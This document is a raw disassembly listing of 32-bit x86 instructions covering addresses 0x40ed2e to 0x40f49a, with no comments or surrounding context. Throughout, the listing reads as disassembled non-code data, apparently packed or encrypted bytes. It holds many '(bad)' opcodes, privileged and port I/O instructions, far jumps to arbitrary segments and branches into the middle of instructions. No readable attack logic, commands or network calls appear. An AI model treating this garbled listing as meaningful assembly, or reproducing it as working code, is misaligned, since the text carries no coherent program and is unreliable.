  40ed2e:	jecxz  0x40ed2d
  40ed30:	mov    ds:0xe4b58ac5,eax
  40ed35:	ins    DWORD PTR es:[edi],dx
  40ed36:	mov    bh,0x6a
  40ed38:	nop    DWORD PTR [ecx]
  40ed3b:	mov    ch,0xfa
  40ed3d:	lahf   
  40ed3e:	jmp    0xc555:0x1d637c04
  40ed45:	(bad)  
  40ed46:	aam    0xfb
  40ed48:	and    DWORD PTR [edx],edx
  40ed4a:	dec    edi
  40ed4b:	xchg   ebp,eax
  40ed4c:	adc    eax,0xb2884e99
  40ed51:	idiv   BYTE PTR [ebp+0x7767ae36]
  40ed57:	mov    dh,0x97
  40ed59:	mov    DWORD PTR [eax],edx
  40ed5b:	and    DWORD PTR [ecx],eax
  40ed5d:	inc    ebx
  40ed5e:	mov    bh,0xec
  40ed60:	push   0xffffff8a
  40ed62:	inc    ecx
  40ed63:	or     eax,0x3310acba
  40ed68:	mov    edx,0xa4e3dbdc
  40ed6d:	or     dl,BYTE PTR [edx-0x61c7d31d]
  40ed73:	or     ebx,ebx
  40ed75:	imul   edi,DWORD PTR ds:0x7b9f1c62,0x7a
  40ed7c:	std    
  40ed7d:	jp     0x40edaf
  40ed7f:	cmc    
  40ed80:	sbb    eax,0x3cceb97c
  40ed85:	ins    BYTE PTR es:[edi],dx
  40ed86:	fild   QWORD PTR [ebx+ebp*8+0x50]
  40ed8a:	adc    ebp,esp
  40ed8c:	mov    eax,0x192d8b4d
  40ed91:	(bad)  
  40ed92:	into   
  40ed93:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ed94:	sbb    ebx,DWORD PTR [edx+edi*1]
  40ed97:	loop   0x40edb7
  40ed99:	jp     0x40ed50
  40ed9b:	stc    
  40ed9c:	sub    BYTE PTR [edi+0x23],ch
  40ed9f:	in     al,0xfe
  40eda1:	rol    DWORD PTR [ecx],0x1c
  40eda4:	ror    BYTE PTR [ecx],0xcf
  40eda7:	aam    0x84
  40eda9:	cmp    al,BYTE PTR fs:[esi-0x4bea8064]
  40edb0:	cld    
  40edb1:	out    dx,eax
  40edb2:	mov    esp,0x402a5def
  40edb7:	scas   eax,DWORD PTR es:[edi]
  40edb8:	(bad)  
  40edba:	mov    edx,0x4fe73511
  40edbf:	iret   
  40edc0:	(bad)  
  40edc1:	and    eax,0x6391d48a
  40edc6:	(bad)  
  40edc7:	arpl   WORD PTR [ecx-0x2ccb8fcd],sp
  40edcd:	add    bh,ch
  40edcf:	mov    ds:0xf0ca1b9c,al
  40edd4:	xchg   DWORD PTR [ebp-0x5c],ebp
  40edd7:	mov    al,0x4c
  40edd9:	sti    
  40edda:	mov    bl,0x9d
  40eddc:	mov    ebx,0xc875f968
  40ede1:	mov    cl,0x97
  40ede3:	sub    dh,0xac
  40ede6:	mov    eax,ss
  40ede8:	cmp    al,0xde
  40edea:	fcmove st,st(4)
  40edec:	or     DWORD PTR [ebx+0x7c745c36],ebx
  40edf2:	pop    eax
  40edf3:	popf   
  40edf4:	popf   
  40edf5:	lods   eax,DWORD PTR ds:[esi]
  40edf6:	cli    
  40edf7:	add    bh,BYTE PTR [edi+eiz*8-0x39]
  40edfb:	fs or  bl,bl
  40edfe:	mov    dl,0x66
  40ee00:	pop    es
  40ee01:	mov    edx,0xa900bba6
  40ee06:	retf   
  40ee07:	mov    edi,0xb28966b9
  40ee0c:	push   cs
  40ee0d:	into   
  40ee0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee0f:	cmp    DWORD PTR [ebx+0x38bdfc80],edi
  40ee15:	sahf   
  40ee16:	and    eax,0x385935af
  40ee1b:	test   al,0xda
  40ee1d:	push   eax
  40ee1e:	mov    ah,BYTE PTR [ebx+0x72]
  40ee21:	ror    DWORD PTR [ebx+edi*2+0x21],0x51
  40ee26:	and    al,0xb
  40ee28:	inc    eax
  40ee29:	inc    ebp
  40ee2a:	fbld   TBYTE PTR [ecx+0x28]
  40ee2d:	cwde   
  40ee2e:	xor    al,0x2
  40ee30:	mov    cs,WORD PTR [edx+0x5c]
  40ee33:	sub    BYTE PTR [ecx+0x23],bh
  40ee36:	outs   dx,DWORD PTR ds:[esi]
  40ee37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee38:	mov    bl,0x22
  40ee3a:	mov    ah,0x92
  40ee3c:	pop    es
  40ee3d:	pop    ebp
  40ee3e:	daa    
  40ee3f:	dec    ebp
  40ee40:	adc    eax,0x9bb0027d
  40ee45:	mov    bl,0xef
  40ee47:	inc    ebp
  40ee48:	dec    ebp
  40ee49:	imul   esi,edx,0xc
  40ee4c:	jb     0x40ee38
  40ee4e:	jbe    0x40ee99
  40ee50:	repz xchg ebx,eax
  40ee52:	and    DWORD PTR [ecx+0x5280c128],edx
  40ee58:	jl     0x40ede1
  40ee5a:	xchg   esp,eax
  40ee5b:	jno    0x40ee10
  40ee5d:	jmp    0x40ee31
  40ee5f:	xchg   DWORD PTR [esi-0x21],edi
  40ee62:	leave  
  40ee63:	jl     0x40ee2d
  40ee65:	cmovbe ebp,DWORD PTR [esi+0x49]
  40ee69:	push   0x54
  40ee6b:	or     bh,ah
  40ee6d:	or     dl,dl
  40ee6f:	pop    eax
  40ee70:	dec    ebp
  40ee71:	addr16 out dx,al
  40ee73:	fistp  DWORD PTR [ecx]
  40ee75:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40ee77:	mov    ecx,0x4dbea826
  40ee7c:	jl     0x40ee85
  40ee7e:	cmp    bl,BYTE PTR [edx]
  40ee80:	pop    ecx
  40ee81:	popa   
  40ee82:	mov    ebx,0x8c969939
  40ee87:	pop    edi
  40ee88:	push   eax
  40ee89:	scas   al,BYTE PTR es:[edi]
  40ee8a:	push   es
  40ee8b:	(bad)  
  40ee8c:	ins    DWORD PTR es:[edi],dx
  40ee8d:	add    BYTE PTR [ebx],0x3e
  40ee90:	gs jno 0x40eed9
  40ee93:	cmp    al,0x47
  40ee95:	pop    ebx
  40ee96:	push   es
  40ee97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee98:	xchg   esp,eax
  40ee99:	dec    esi
  40ee9a:	fneni(8087 only) 
  40ee9c:	jnp    0x40eec2
  40ee9e:	pop    esp
  40ee9f:	xor    eax,0xb13c09ea
  40eea4:	xor    bl,BYTE PTR [edi+0x3882151f]
  40eeaa:	inc    esp
  40eeab:	call   FWORD PTR [ecx-0x5c]
  40eeae:	mov    cl,0x3d
  40eeb0:	pop    es
  40eeb1:	pmaxub mm0,mm7
  40eeb4:	mov    ebp,0x835b9bcd
  40eeb9:	dec    esp
  40eeba:	jb     0x40eed0
  40eebc:	or     ah,BYTE PTR [ebx-0x59]
  40eebf:	enter  0x58a7,0xe9
  40eec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eec4:	loope  0x40eeb6
  40eec6:	imul   edi,DWORD PTR ds:0xe9b65c62,0x6c9d3156
  40eed0:	je     0x40ef0c
  40eed2:	mov    ax,sp
  40eed5:	mov    edx,0xa03af656
  40eeda:	add    al,0x1f
  40eedc:	mov    esp,0x5e930ff7
  40eee1:	xchg   edi,eax
  40eee2:	xchg   BYTE PTR [ecx+0x34ef0215],ah
  40eee8:	xchg   ecx,eax
  40eee9:	retf   0x251a
  40eeec:	pop    ds
  40eeed:	test   al,0x2b
  40eeef:	xor    eax,0x59e15584
  40eef4:	mov    ds:0xa4bcdf09,eax
  40eef9:	jns    0x40eecb
  40eefb:	cmp    edi,esp
  40eefd:	mov    bl,BYTE PTR [edi+0x8]
  40ef00:	mov    ds:0x7e4d125e,eax
  40ef05:	jmp    FWORD PTR [edx]
  40ef07:	loope  0x40eebc
  40ef09:	push   0x582b9679
  40ef0e:	cmp    al,0x0
  40ef10:	mov    ah,0xa3
  40ef12:	jo     0x40ef73
  40ef14:	shr    dh,0x8e
  40ef17:	les    edx,FWORD PTR [edi-0x1b]
  40ef1a:	in     eax,dx
  40ef1b:	or     al,0xc7
  40ef1d:	outs   dx,BYTE PTR ds:[esi]
  40ef1e:	inc    edx
  40ef1f:	xor    BYTE PTR [edx+0x774cafdb],bh
  40ef25:	xchg   ecx,eax
  40ef26:	jl     0x40ef62
  40ef28:	aas    
  40ef29:	stos   DWORD PTR es:[edi],eax
  40ef2a:	mov    ebp,0x32fb8615
  40ef2f:	xor    BYTE PTR [ebp-0x78],bl
  40ef32:	add    ah,bl
  40ef34:	xchg   BYTE PTR [edx-0x272c2861],dl
  40ef3a:	mov    ebx,0xde14bf22
  40ef3f:	jg     0x40ef68
  40ef41:	and    dl,BYTE PTR [ecx+edi*8-0x6ffbc5e3]
  40ef48:	out    dx,eax
  40ef49:	retf   
  40ef4a:	sbb    ah,BYTE PTR [edi+0x57]
  40ef4d:	dec    ebx
  40ef4e:	mov    ds:0x6376cd11,eax
  40ef53:	not    DWORD PTR [edx]
  40ef55:	stc    
  40ef56:	shl    BYTE PTR [eax+0x20],1
  40ef59:	ficom  DWORD PTR [esp+edi*4+0x30]
  40ef5d:	xchg   ecx,eax
  40ef5e:	ret    
  40ef5f:	ins    DWORD PTR es:[edi],dx
  40ef60:	shl    DWORD PTR [ebx],cl
  40ef62:	outs   dx,DWORD PTR ds:[esi]
  40ef63:	jp     0x40ef6d
  40ef65:	scas   eax,DWORD PTR es:[edi]
  40ef66:	push   ecx
  40ef67:	jecxz  0x40ef9d
  40ef69:	ror    BYTE PTR [esi],1
  40ef6b:	and    bh,0xa8
  40ef6e:	dec    ebx
  40ef6f:	imul   ebp,DWORD PTR [ebx+0x4aca41d9],0x3920b697
  40ef79:	ja     0x40ef73
  40ef7b:	adc    BYTE PTR [ebx-0x43],al
  40ef7e:	(bad)  
  40ef7f:	aam    0x4f
  40ef81:	jae    0x40ef03
  40ef83:	adc    eax,0xe781dbd8
  40ef88:	test   eax,ebx
  40ef8a:	sahf   
  40ef8b:	lds    ebx,FWORD PTR [edx-0xc]
  40ef8e:	mov    edx,0xcd3227bf
  40ef93:	(bad)  
  40ef94:	enter  0xfd8d,0xa7
  40ef98:	out    dx,eax
  40ef99:	mov    eax,fs
  40ef9b:	retf   
  40ef9c:	sub    eax,ebp
  40ef9e:	fadd   DWORD PTR [edx+ecx*1+0x36199489]
  40efa5:	lods   al,BYTE PTR ds:[esi]
  40efa6:	and    ah,dh
  40efa8:	or     DWORD PTR [edi-0x43825320],edx
  40efae:	push   ds
  40efaf:	or     esi,edx
  40efb1:	das    
  40efb2:	call   0x23a70ff5
  40efb7:	push   esi
  40efb8:	push   esp
  40efb9:	dec    eax
  40efba:	mov    al,ds:0xd98ce93f
  40efbf:	pushf  
  40efc0:	sub    edx,DWORD PTR [ebp-0x1a]
  40efc3:	icebp  
  40efc4:	bound  edx,QWORD PTR [ebx+0x50c51dec]
  40efca:	add    esi,DWORD PTR [edi-0x7503276c]
  40efd0:	mov    esi,0x841237b4
  40efd5:	cmp    BYTE PTR [esp+ebp*2-0x68],bl
  40efd9:	mov    edi,0xebb1f5dd
  40efde:	sub    DWORD PTR [edi-0x65f6be2d],edx
  40efe4:	shl    DWORD PTR [edi+0x104d1b10],cl
  40efea:	inc    ecx
  40efeb:	jne    0x40f006
  40efed:	iret   
  40efee:	pop    ds
  40efef:	push   esi
  40eff0:	lahf   
  40eff1:	inc    edx
  40eff2:	inc    esp
  40eff3:	push   ecx
  40eff4:	js     0x7b909a2b
  40effa:	xor    al,0x7c
  40effc:	in     al,0x79
  40effe:	sbb    al,BYTE PTR [esi+0x5]
  40f001:	aaa    
  40f002:	int3   
  40f003:	pop    eax
  40f004:	out    dx,eax
  40f005:	outs   dx,BYTE PTR ds:[esi]
  40f006:	retf   0x5f67
  40f009:	dec    eax
  40f00a:	jbe    0x40efd8
  40f00c:	(bad)  
  40f00d:	sub    dh,BYTE PTR [ebx]
  40f00f:	ds clc 
  40f011:	mov    dh,0x76
  40f014:	call   0x41ee92c0
  40f019:	imul   edi,DWORD PTR [esi],0x50
  40f01c:	mov    esp,0x8464f4e1
  40f021:	or     bh,bl
  40f023:	cmc    
  40f024:	call   0x593a:0x500ab152
  40f02b:	retf   
  40f02c:	xchg   edi,eax
  40f02d:	mov    DWORD PTR [eax],esi
  40f02f:	mov    al,ds:0xc1d6c2e7
  40f034:	(bad)  
  40f036:	je     0x40f082
  40f038:	call   0x5ef9568c
  40f03d:	sbb    ebp,DWORD PTR [eax+0x441c5bb0]
  40f043:	pop    esp
  40f044:	in     al,dx
  40f045:	retf   
  40f046:	pop    ebx
  40f047:	into   
  40f048:	sub    DWORD PTR [ebx+0x354baf4b],ebp
  40f04e:	adc    DWORD PTR [ebx+ebx*4],0xa5f89a06
  40f055:	jp     0x40f00c
  40f057:	cmp    ebx,DWORD PTR [ecx]
  40f059:	sbb    cl,BYTE PTR ds:0x6a1d3fb0
  40f05f:	cli    
  40f060:	adc    eax,0x660cf22d
  40f065:	or     dl,BYTE PTR [edx]
  40f067:	xchg   ecx,eax
  40f068:	lods   eax,DWORD PTR ds:[esi]
  40f069:	ror    DWORD PTR [ebx],0xcc
  40f06c:	mov    ch,0xe9
  40f06e:	movsx  ecx,dx
  40f071:	popa   
  40f072:	pop    ebx
  40f073:	enter  0xb45,0xfb
  40f077:	cmp    bh,bh
  40f079:	cmp    DWORD PTR [edi+0x4b508189],edi
  40f07f:	push   0x51
  40f081:	inc    esp
  40f082:	out    dx,al
  40f083:	test   al,0xc9
  40f085:	ja     0x40f082
  40f087:	inc    esi
  40f088:	xchg   edi,eax
  40f089:	sub    BYTE PTR [ebx],bh
  40f08b:	retf   
  40f08c:	aaa    
  40f08d:	jno    0x40f0a0
  40f08f:	repz add BYTE PTR [edi+0x41],bl
  40f093:	add    BYTE PTR [ecx],bl
  40f095:	mov    eax,ds:0xe415856e
  40f09a:	push   cs
  40f09b:	add    ecx,DWORD PTR ds:0xd033b822
  40f0a1:	adc    bh,al
  40f0a3:	lea    ebx,[ebx+ebp*2-0x14f9ec34]
  40f0aa:	dec    ebp
  40f0ab:	sub    eax,0x8bc0ff17
  40f0b0:	pop    es
  40f0b1:	xchg   ebx,eax
  40f0b2:	xchg   ebx,eax
  40f0b3:	push   eax
  40f0b4:	mov    edx,0x93b03840
  40f0b9:	add    DWORD PTR [ecx-0xdcb65e0],ecx
  40f0bf:	inc    ebx
  40f0c0:	jne    0x40f098
  40f0c2:	(bad)  
  40f0c3:	popf   
  40f0c4:	mov    WORD PTR [ebx-0x4c],?
  40f0c7:	and    edi,ecx
  40f0c9:	test   edi,edi
  40f0cb:	pushf  
  40f0cc:	jo     0x40f10f
  40f0ce:	imul   eax,esp,0x8da50773
  40f0d4:	shr    DWORD PTR [esi],cl
  40f0d6:	mov    dl,0x56
  40f0d8:	add    BYTE PTR [eax+0xf45a35b],ah
  40f0de:	push   edx
  40f0df:	mov    al,bh
  40f0e1:	stos   BYTE PTR es:[edi],al
  40f0e2:	fisttp DWORD PTR [edi-0x5ccbb0ab]
  40f0e8:	inc    eax
  40f0e9:	xor    DWORD PTR [esp+edx*1+0x59],edx
  40f0ed:	inc    edi
  40f0ee:	jmp    0x8f89:0xfb86e51a
  40f0f5:	add    eax,0x6b8f9a9c
  40f0fa:	pop    ebx
  40f0fb:	cmp    ecx,0x6
  40f0fe:	nop
  40f0ff:	lds    ebp,FWORD PTR [ecx+0x3c]
  40f102:	icebp  
  40f103:	or     eax,0x9ca88b2f
  40f108:	imul   edx,DWORD PTR [ebx],0x47
  40f10b:	mov    ecx,0xe7ec259e
  40f110:	test   eax,0xf6e12454
  40f115:	xchg   dx,ax
  40f117:	ins    WORD PTR es:[edi],dx
  40f119:	push   ebx
  40f11a:	mov    ds:0x588d6a81,al
  40f11f:	iret   
  40f120:	retf   
  40f121:	scas   eax,DWORD PTR es:[edi]
  40f122:	push   edi
  40f123:	aas    
  40f124:	test   al,0xd8
  40f126:	outs   dx,DWORD PTR ds:[esi]
  40f127:	pop    ebp
  40f128:	sub    ebp,ebp
  40f12a:	ss jmp 0x139d0554
  40f130:	fisub  DWORD PTR [ebp+edi*8+0x7b]
  40f134:	dec    ebp
  40f135:	pop    ebx
  40f136:	cdq    
  40f137:	and    edx,DWORD PTR [edi+ebp*1]
  40f13a:	xor    ecx,DWORD PTR ds:[eax-0x7a]
  40f13e:	dec    edi
  40f13f:	push   edx
  40f140:	mov    al,ds:0x727ba0ae
  40f145:	data16 cmp BYTE PTR [ebx],ch
  40f148:	jns    0x40f13e
  40f14a:	pushf  
  40f14b:	fldl2e 
  40f14d:	inc    eax
  40f14e:	loop   0x40f16f
  40f150:	lods   eax,DWORD PTR ds:[esi]
  40f151:	cdq    
  40f152:	add    ebp,eax
  40f154:	xor    al,0xa7
  40f156:	mov    esi,0x7751a274
  40f15b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f15c:	inc    edi
  40f15d:	addr16 xchg esi,eax
  40f15f:	fsubr  DWORD PTR [ecx+ebx*2+0x13]
  40f163:	ror    DWORD PTR [ecx],cl
  40f165:	cmp    eax,0x17b202be
  40f16a:	es call 0xfea6c0bb
  40f170:	out    dx,eax
  40f171:	test   al,0x41
  40f173:	int3   
  40f174:	fbld   TBYTE PTR [esi-0x2d]
  40f177:	pop    edi
  40f178:	mov    ebp,0x897a4808
  40f17d:	or     cl,BYTE PTR [ebx]
  40f17f:	cwde   
  40f180:	xor    eax,0xcb631a1a
  40f185:	cmp    eax,0xb4fac295
  40f18a:	lock dec eax
  40f18c:	lea    esi,[ecx+0x6]
  40f18f:	pop    ebp
  40f190:	pop    es
  40f191:	in     eax,0xea
  40f193:	gs pop ebx
  40f195:	loop   0x40f1a8
  40f197:	lods   eax,DWORD PTR ds:[esi]
  40f198:	mov    bl,0x40
  40f19a:	push   cs
  40f19b:	repz push ebp
  40f19d:	mov    edi,eax
  40f19f:	xlat   BYTE PTR ds:[ebx]
  40f1a0:	sar    esp,1
  40f1a2:	jb     0x40f1e1
  40f1a4:	into   
  40f1a5:	push   ds
  40f1a6:	into   
  40f1a7:	fwait
  40f1a8:	ja     0x40f178
  40f1aa:	out    0x97,eax
  40f1ac:	mul    DWORD PTR [edx+0x4cca3e0d]
  40f1b2:	call   0xe6cd4226
  40f1b7:	pop    esi
  40f1b8:	repnz and DWORD PTR [ebx+0x256c924c],esi
  40f1bf:	mov    bl,ch
  40f1c1:	cli    
  40f1c2:	sbb    bl,BYTE PTR [eax]
  40f1c4:	push   es
  40f1c5:	mov    ds:0x5db547f2,al
  40f1ca:	pushf  
  40f1cb:	ret    
  40f1cc:	adc    DWORD PTR [ebx+ebp*8+0x60b3a381],0x4c025b8e
  40f1d7:	mov    al,ds:0x9414f9a2
  40f1dc:	mov    ebp,0xc7050962
  40f1e1:	cmp    DWORD PTR [eax],ebx
  40f1e3:	int    0xd7
  40f1e5:	dec    esp
  40f1e6:	out    0xc,eax
  40f1e8:	push   ds
  40f1e9:	outs   dx,DWORD PTR ds:[esi]
  40f1ea:	and    cl,BYTE PTR [edx-0x13ac46e0]
  40f1f0:	aad    0xf6
  40f1f2:	loope  0x40f26d
  40f1f4:	imul   edi,DWORD PTR [ecx+0x79],0xe4a42df7
  40f1fb:	fwait
  40f1fc:	ins    DWORD PTR es:[edi],dx
  40f1fd:	xlat   BYTE PTR ds:[ebx]
  40f1fe:	xor    edx,esp
  40f200:	inc    ebp
  40f201:	inc    ecx
  40f202:	ds ss xchg ecx,eax
  40f205:	cmovb  ebx,ecx
  40f208:	mov    eax,ds:0x3ac42e79
  40f20d:	shr    DWORD PTR [esi-0x7f],0x82
  40f211:	sbb    ch,al
  40f213:	push   ecx
  40f214:	lods   eax,DWORD PTR ds:[esi]
  40f215:	jns    0x40f256
  40f217:	ss stos BYTE PTR es:[edi],al
  40f219:	add    DWORD PTR [eax+eiz*4],0x33
  40f21d:	mov    ebp,0xc7223084
  40f222:	addr16 mov esp,0xff2db29f
  40f228:	push   ecx
  40f229:	add    ah,BYTE PTR [esp+ebx*2+0x6055cec5]
  40f230:	mov    edi,0xe13f0d4c
  40f235:	sahf   
  40f236:	dec    esp
  40f237:	jg     0x40f293
  40f239:	jmp    0x7289:0x60c9653e
  40f240:	in     ax,dx
  40f242:	mov    ecx,0x7cbcc50c
  40f247:	sbb    edx,ecx
  40f249:	scas   eax,DWORD PTR es:[edi]
  40f24a:	(bad)  
  40f24b:	arpl   WORD PTR [esi+0x59811745],cx
  40f251:	in     al,0xeb
  40f253:	xchg   esi,eax
  40f254:	add    cl,ch
  40f256:	loopne 0x40f20d
  40f258:	sub    dl,bl
  40f25a:	arpl   WORD PTR [ebx],si
  40f25c:	pop    esi
  40f25d:	shl    DWORD PTR [ecx-0xec10c70],cl
  40f263:	push   esi
  40f264:	jle    0x40f248
  40f266:	adc    ah,BYTE PTR [edx+0x10]
  40f269:	and    al,cl
  40f26b:	and    BYTE PTR ds:0xeb6f4d89,cl
  40f271:	std    
  40f272:	shl    BYTE PTR [edi-0x41],cl
  40f275:	dec    ecx
  40f276:	jmp    0x40f2de
  40f278:	ret    
  40f279:	js     0x40f28b
  40f27b:	mov    ss,WORD PTR [eax]
  40f27d:	popa   
  40f27e:	fisttp WORD PTR [edx]
  40f280:	clc    
  40f281:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f283:	dec    ebx
  40f284:	inc    edi
  40f285:	sub    BYTE PTR [esi],0x3c
  40f288:	adc    dl,BYTE PTR [eax]
  40f28a:	sub    BYTE PTR [edi+0x61],dh
  40f28d:	mov    edi,0x3495df1a
  40f292:	cmc    
  40f293:	inc    edx
  40f294:	xchg   esp,eax
  40f295:	push   ecx
  40f296:	lods   al,BYTE PTR ds:[esi]
  40f297:	les    ebx,FWORD PTR [esp+edx*1+0x6a]
  40f29b:	popf   
  40f29c:	cmp    eax,0x3dacda8a
  40f2a1:	loopne 0x40f23c
  40f2a3:	xchg   BYTE PTR ds:0x845e1d5,al
  40f2a9:	(bad)  
  40f2aa:	fsubr  QWORD PTR [ecx+0x3c393d9e]
  40f2b0:	ror    BYTE PTR [edi+edx*8-0x21],0x30
  40f2b5:	and    al,BYTE PTR [ebx-0x1b]
  40f2b8:	inc    edi
  40f2b9:	lds    eax,FWORD PTR ds:0xa344fc9b
  40f2bf:	imul   ecx,DWORD PTR [ebx+0x32],0x5a
  40f2c3:	xchg   ebx,eax
  40f2c4:	(bad)  
  40f2c8:	shr    eax,cl
  40f2ca:	je     0x40f33f
  40f2cc:	(bad)  
  40f2cd:	out    0x17,eax
  40f2cf:	mov    ds:0x95486fa6,al
  40f2d4:	push   esi
  40f2d5:	ss xchg ebp,eax
  40f2d7:	inc    edi
  40f2d8:	add    eax,0x32806f70
  40f2dd:	popa   
  40f2de:	lock imul ecx,DWORD PTR ds:0x174ce7fe,0x66
  40f2e6:	mov    fs:0x4f931645,al
  40f2ec:	jnp    0x40f279
  40f2ee:	stos   DWORD PTR es:[edi],eax
  40f2ef:	xchg   DWORD PTR [edi-0x22b267fc],edi
  40f2f5:	pop    ebp
  40f2f6:	and    BYTE PTR [edi+0x7b],ah
  40f2f9:	std    
  40f2fa:	xchg   ebp,eax
  40f2fb:	retf   0x76ba
  40f2fe:	push   esi
  40f2ff:	adc    esp,DWORD PTR [ebx-0x2e]
  40f302:	mov    DWORD PTR [ebx+ebx*4+0x63],ecx
  40f306:	and    cl,BYTE PTR [esi+0x2ae4cf73]
  40f30c:	xchg   ebp,eax
  40f30d:	xchg   esp,eax
  40f30e:	add    ecx,ebx
  40f310:	repz loope 0x40f2cf
  40f313:	sbb    eax,0xdf727b83
  40f318:	fs fwait
  40f31a:	cmp    al,BYTE PTR [ecx+0x45]
  40f31d:	cs dec eax
  40f31f:	aas    
  40f320:	mov    dh,0x6a
  40f322:	ret    
  40f323:	cdq    
  40f324:	mov    ebx,0x46692d2d
  40f329:	xchg   ecx,eax
  40f32a:	retfw  
  40f32c:	outs   dx,DWORD PTR ds:[esi]
  40f32d:	stc    
  40f32e:	mov    esi,0xedc7e67e
  40f333:	imul   eax,DWORD PTR [ebx],0x8d423833
  40f339:	pop    es
  40f33a:	test   al,0xc9
  40f33c:	sub    dh,dl
  40f33e:	fwait
  40f33f:	mov    eax,DWORD PTR [ecx+0x8]
  40f342:	out    0x2d,al
  40f344:	sahf   
  40f345:	stos   DWORD PTR es:[edi],eax
  40f346:	out    dx,al
  40f347:	and    eax,0x3e2be627
  40f34c:	ds daa 
  40f34e:	imul   esp,DWORD PTR [esi],0xffffffa6
  40f351:	jmp    0x40f362
  40f353:	xchg   edi,eax
  40f354:	bound  eax,QWORD PTR [edi+0x30]
  40f357:	xchg   edx,eax
  40f358:	fidiv  DWORD PTR [edi+0x7fa915c0]
  40f35e:	ror    BYTE PTR [edx+0x5f],1
  40f361:	push   0x8fbae62f
  40f366:	addr16 xor al,0x28
  40f369:	push   ecx
  40f36a:	xor    DWORD PTR [esp+ecx*4+0x425b7e5a],0xa2b03896
  40f375:	pop    ecx
  40f376:	cmp    edx,DWORD PTR [esi-0x37]
  40f379:	jb     0xc846080c
  40f37f:	test   eax,0x268509a6
  40f384:	nop
  40f385:	les    ebx,FWORD PTR [ebx]
  40f387:	les    esi,FWORD PTR [edi-0x7a]
  40f38a:	adc    dl,BYTE PTR ds:0x76cec22
  40f390:	xchg   DWORD PTR [ebx+ebx*2-0x67c34465],eax
  40f397:	mov    ds:0x55be70d5,al
  40f39c:	cmp    dl,BYTE PTR [esi+esi*8]
  40f39f:	push   cs
  40f3a0:	sub    al,0xd8
  40f3a2:	jg     0x40f415
  40f3a4:	bound  ebx,QWORD PTR [eax-0x40]
  40f3a7:	jle    0x40f3e5
  40f3a9:	xor    BYTE PTR [ebx+0x9],dh
  40f3ac:	mov    dl,0x0
  40f3ae:	add    BYTE PTR [esi-0xb0791d8],bh
  40f3b4:	cs pop esi
  40f3b6:	xchg   edx,eax
  40f3b7:	cmp    DWORD PTR [ecx],esi
  40f3b9:	push   ecx
  40f3ba:	xor    BYTE PTR [eax+eiz*8-0x3b],dh
  40f3be:	jae    0x40f3ee
  40f3c0:	lods   al,BYTE PTR ds:[esi]
  40f3c1:	jl     0x40f3f1
  40f3c3:	jecxz  0x40f387
  40f3c5:	fisub  DWORD PTR [ebx]
  40f3c7:	xor    eax,0x69add960
  40f3cc:	xchg   DWORD PTR [esi-0x6b],ebp
  40f3cf:	xchg   BYTE PTR [edx],bh
  40f3d1:	leave  
  40f3d2:	pushf  
  40f3d3:	cli    
  40f3d4:	xchg   ecx,eax
  40f3d5:	sbb    BYTE PTR [edi-0x36a1815e],ah
  40f3db:	sub    BYTE PTR [ebx],0xd
  40f3de:	out    dx,al
  40f3df:	and    dl,BYTE PTR [eax]
  40f3e1:	adc    DWORD PTR [edx],edx
  40f3e3:	retf   0x33f8
  40f3e6:	jnp    0x40f40e
  40f3e8:	mov    dh,0x4a
  40f3ea:	fxch   st(5)
  40f3ec:	jbe    0x40f42c
  40f3ee:	mov    dh,0x54
  40f3f0:	fisttp WORD PTR [edx-0x7]
  40f3f3:	test   BYTE PTR [ebx-0x44],al
  40f3f6:	pop    eax
  40f3f7:	add    edx,DWORD PTR [ebp-0x2b]
  40f3fa:	xchg   ebx,eax
  40f3fb:	mov    DWORD PTR [edx+0x60],ebx
  40f3fe:	jno    0x40f47c
  40f400:	add    al,0x83
  40f402:	(bad)  
  40f403:	pusha  
  40f404:	jbe    0x40f3c3
  40f406:	popa   
  40f407:	inc    edx
  40f408:	ss pop ebx
  40f40a:	outs   dx,BYTE PTR ds:[esi]
  40f40b:	jge    0x40f412
  40f40d:	and    eax,0xf8a0726e
  40f412:	xlat   BYTE PTR ds:[ebx]
  40f413:	cmp    eax,0xaa1e7847
  40f418:	cmp    al,0xe8
  40f41a:	push   esp
  40f41b:	stos   DWORD PTR es:[edi],eax
  40f41c:	push   cs
  40f41d:	jl     0x40f497
  40f41f:	std    
  40f420:	jmp    0x2c79:0xf64a8410
  40f427:	cwde   
  40f428:	xor    esi,DWORD PTR [edi-0x58]
  40f42b:	hlt    
  40f42c:	bound  edx,QWORD PTR [esi]
  40f42e:	mov    cl,0xa0
  40f430:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40f432:	jmp    0x40f456
  40f434:	pop    esi
  40f435:	push   edi
  40f436:	imul   ecx,DWORD PTR [edi],0xb0958d16
  40f43c:	lock xchg ebx,eax
  40f43e:	sbb    eax,DWORD PTR [ebx-0x35ceee64]
  40f444:	add    edi,esp
  40f446:	jge    0x40f43a
  40f448:	stos   BYTE PTR es:[edi],al
  40f449:	hlt    
  40f44a:	xchg   edi,eax
  40f44b:	test   al,0x46
  40f44d:	mov    ecx,0x86581145
  40f452:	sbb    DWORD PTR [ebx-0x5],0x75
  40f456:	xchg   ebp,eax
  40f457:	(bad)  
  40f459:	add    DWORD PTR [edx],0x9019fd29
  40f45f:	add    BYTE PTR [esi+0x51],0x58
  40f463:	inc    eax
  40f464:	push   ecx
  40f465:	shl    BYTE PTR [esi+0x22],cl
  40f468:	push   edi
  40f469:	aam    0x7b
  40f46b:	mov    dl,0xef
  40f46d:	ja     0x40f41c
  40f46f:	lea    ebx,[esi+0x14]
  40f472:	dec    BYTE PTR [edi+0x1]
  40f475:	lods   al,BYTE PTR ds:[esi]
  40f476:	xchg   ebx,eax
  40f477:	hlt    
  40f478:	(bad)
  40f47c:	mov    ds:0xf0495d5c,al
  40f481:	mov    ebx,DWORD PTR [edx]
  40f483:	xor    BYTE PTR [esi],0x14
  40f486:	pop    esp
  40f487:	jmp    0x5c564449
  40f48c:	jne    0x40f48a
  40f48e:	sahf   
  40f48f:	pop    esi
  40f490:	(bad)  
  40f491:	sub    al,0x63
  40f493:	pop    eax
  40f494:	adc    al,BYTE PTR [edx-0x5540b8ed]
  40f49a:	leave  
